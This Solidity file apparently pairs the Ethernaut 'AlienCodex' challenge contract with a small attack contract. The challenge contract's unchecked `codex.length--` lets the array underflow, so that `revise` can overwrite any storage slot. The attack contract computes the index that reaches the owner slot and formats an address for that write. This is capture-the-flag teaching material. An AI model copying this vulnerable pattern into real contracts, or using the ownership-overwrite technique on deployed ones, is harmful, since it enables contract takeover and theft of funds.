// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "../lib/Ownable-05.sol";

contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function make_contact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}

contract AlienCodexAttack {
    function getEleIndex(uint slot) public pure returns (uint) {
        return
            uint256(2) ** uint256(256) -
            uint256(keccak256(abi.encodePacked(slot)));
    }

    function getBytesAddr(address addr) public pure returns (bytes32) {
        return bytes32(uint256(uint160(addr)));
    }
}
